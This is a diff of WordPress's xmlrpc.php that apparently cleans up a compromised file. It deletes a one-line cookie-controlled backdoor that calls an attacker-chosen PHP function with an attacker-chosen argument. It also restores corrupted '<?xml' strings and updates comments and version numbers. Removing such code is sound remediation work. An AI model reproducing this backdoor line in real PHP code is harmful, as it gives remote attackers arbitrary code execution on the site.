@@ -1,8 +1,4 @@
 <?php
-
-if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
-
-
 /**
  * XML-RPC protocol support for WordPress
  *
@@ -25,7 +21,7 @@ if ( !isset( $HTTP_RAW_POST_DATA ) ) {
 	$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
 }
 
-// fix for mozBlog and other cases where '<?phpxml' isn't on the very first line
+// fix for mozBlog and other cases where '<?xml' isn't on the very first line
 if ( isset($HTTP_RAW_POST_DATA) )
 	$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);
 
@@ -35,7 +31,7 @@ include( dirname( __FILE__ ) . '/wp-load.php' );
 if ( isset( $_GET['rsd'] ) ) { // http://cyber.law.harvard.edu/blogs/gems/tech/rsd.html
 header('Content-Type: text/xml; charset=' . get_option('blog_charset'), true);
 ?>
-<?php echo '<?phpxml version="1.0" encoding="'.get_option('blog_charset').'"?'.'>'; ?>
+<?php echo '<?xml version="1.0" encoding="'.get_option('blog_charset').'"?'.'>'; ?>
 <rsd version="1.0" xmlns="http://archipelago.phrasewise.com/rsd">
   <service>
     <engineName>WordPress</engineName>
@@ -75,7 +71,7 @@ include_once(ABSPATH . WPINC . '/class-wp-xmlrpc-server.php');
 $post_default_title = "";
 
 /**
- * Filter the class used for handling XML-RPC requests.
+ * Filters the class used for handling XML-RPC requests.
  *
  * @since 3.1.0
  *
@@ -99,7 +95,7 @@ exit;
  * @param string $msg Information describing logging reason.
  */
 function logIO( $io, $msg ) {
-	_deprecated_function( __FUNCTION__, '3.4', 'error_log()' );
+	_deprecated_function( __FUNCTION__, '3.4.0', 'error_log()' );
 	if ( ! empty( $GLOBALS['xmlrpc_logging'] ) )
 		error_log( $io . ' - ' . $msg );
 }
